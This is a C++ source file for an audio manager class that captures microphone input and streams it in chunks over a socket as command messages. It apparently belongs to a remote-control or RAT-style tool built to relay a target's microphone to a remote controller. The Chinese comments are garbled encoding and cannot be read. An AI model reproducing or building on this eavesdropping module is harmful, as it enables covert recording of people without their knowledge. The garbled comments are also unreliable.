#include "StdAfx.h"
#include "AudioManager.h"

CAudioManager::CAudioManager(void)
{
	m_bWorking = false;
}

CAudioManager::~CAudioManager(void)
{
}

bool CAudioManager::Initialize()
{
	if (!waveInGetNumDevs())  //Ϊ�ҵ���Ƶ�豸
	{
		return false;
	}
	// ����ʹ����.. ��ֹ�ظ�ʹ��
	if (m_bWorking)
	{
		return false;
	}

	m_lpAudio = new CAudio;
	m_bWorking = true;
	return true;
}

void CAudioManager::SendRecordBuffer()
{
	m_hSendThread = CreateThread(NULL, 0, SendAudioDataProc, (LPVOID)this, 0, NULL);
}

DWORD WINAPI CAudioManager::SendAudioDataProc( LPVOID lpParameter )
{
	CAudioManager* pThis = (CAudioManager*)lpParameter;
	if (NULL != pThis)
	{
		const int nBufSize = AUDIO_BUF_SIZE; //��������С
		while (pThis->m_bWorking)
		{
			DWORD	dwBytes = 0;
			UINT	nSendBytes = 0;
			LPBYTE	lpBuffer = pThis->m_lpAudio->getRecordBuffer(&dwBytes);  //��仰����360��ɱ
			if (NULL == lpBuffer)
			{
				break;
			}
			LPBYTE	lpPacket = new BYTE[dwBytes];
			memcpy(lpPacket, lpBuffer, dwBytes);
	        
			MSGINFO_S tagMsgInfo;
			memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
			tagMsgInfo.Msg_id = CMD_AUDIO;
			AUDIODATA_S tagAudioData;
			memset(&tagAudioData, 0, sizeof(AUDIODATA_S));
			tagAudioData.Begin = 0;
			tagAudioData.bRead = false;
			tagAudioData.dwSize = dwBytes;  //���ݴ�С
			tagAudioData.Id = 0;
			memcpy((char*)tagMsgInfo.context, (char*)&tagAudioData, sizeof(AUDIODATA_S));  //�������ݿ�Ĵ�С
			bool bSuccess = true;
			pThis->m_moduleSocket.SendCommand(pThis->m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);

			//��������
			int nCount = dwBytes / nBufSize + 1;  //���͵Ĵ���
			if (0 == dwBytes % nBufSize)
			{
				nCount = nCount - 1;
			}   
			memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
			memset(&tagAudioData, 0, sizeof(AUDIODATA_S));
			tagAudioData.bRead = false;
			tagAudioData.Id = 1;  //��������
			UINT nBegin = 0;
	        for (int index = 0; index < nCount ; index++)  //ѭ������
			{
				memset(&tagAudioData.Data, 0, nBufSize); //��ʼ������
			    memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
				tagMsgInfo.Msg_id = CMD_AUDIO;

				nBegin = index * nBufSize;  //ÿ�ο�ʼ�������ݵ�λ��
				tagAudioData.Begin = nBegin;
				tagAudioData.dwSize  = 0;
                
				if (index == nCount -1)  //���һ�η���
				{
					tagAudioData.bRead = true;  //��ʱ���Բ���������
					tagAudioData.dwSize = dwBytes;  //���ݵ��ܴ�С
					tagAudioData.Id = 2;
					for (UINT i = nBegin, k = 0; i < dwBytes; i++, k++)
					{
						tagAudioData.Data[k] = lpPacket[i];
					}
				}
				else   //������һ��һ�鷢������
				{
					for (UINT i = nBegin, k = 0; k < nBufSize; i++, k++)
					{
						tagAudioData.Data[k] = lpPacket[i];
					}
				}
				memcpy((char*)tagMsgInfo.context, (char*)&tagAudioData, sizeof(AUDIODATA_S));
				pThis->m_moduleSocket.SendCommand(pThis->m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
			}
			delete[] lpPacket;
			lpPacket = NULL;
//			Sleep(80);
		}
	
	}
	return 0;
}

void CAudioManager::RecvRecordBuffer()
{
	
}

DWORD WINAPI CAudioManager::RecvAudioDataProc( LPVOID lpParameter )
{
	return 0;
}
